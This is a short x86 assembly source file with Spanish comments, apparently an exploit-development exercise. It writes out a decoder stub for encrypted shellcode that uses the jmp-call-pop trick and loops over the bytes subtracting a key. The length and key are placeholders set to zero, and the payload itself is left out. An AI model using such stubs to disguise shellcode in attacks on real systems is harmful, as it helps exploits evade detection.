section .text
global _start
_start:
	jmp short magic				; truco de viaje al pasado
init:
	pop esi						; obtenemos en esi el puntero al string del shellcode
	xor ecx, ecx				; inicializamos ecx
	mov cl,0					; Le damos a cl el valor de la longitud del shellcode
desc:
	sub byte[esi + ecx -1],0		; Restamos el valor de la llave de cifrado a cada byte del SC empezando desde el primer no nulo
	sub cl,1					; Recorremos inversamente el shellcode
	jnz desc
	jmp short sc
magic:
	call init
sc:
	; Aqui iria el shellcode. No hace falta poonerlo porque lo que queremos son los opcodes del descifrador